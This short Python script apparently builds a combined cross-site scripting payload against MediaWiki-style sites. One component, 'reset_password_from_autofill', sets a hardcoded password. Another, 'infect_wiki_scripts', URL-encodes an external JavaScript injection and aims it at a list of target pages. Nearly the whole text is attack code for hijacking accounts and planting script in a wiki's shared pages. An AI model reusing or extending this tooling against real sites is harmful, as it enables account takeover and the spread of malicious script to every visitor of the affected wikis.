from vector import Component
from sources import load_source
import urllib.parse


comb = Component(
    component_id = "combined_xss_1",
    fast_load_part = "",
    jquery_part = (
        Component(
            component_id = "reset_password_from_autofill",
            mw_website_prefix = "/",
            need_password = "qwerty12345"
        ) +
        Component(
            component_id = "infect_wiki_scripts",
            mw_website_prefix = "/",
            urlenc_injection=urllib.parse.quote(
                load_source("common_js_injection.js")
            ),
            negative_pattern="Quqel",
            csv_target_pages = ",".join(
                load_source("rxp_page_list.txt").splitlines()
            )
        )
    )
)
print(comb)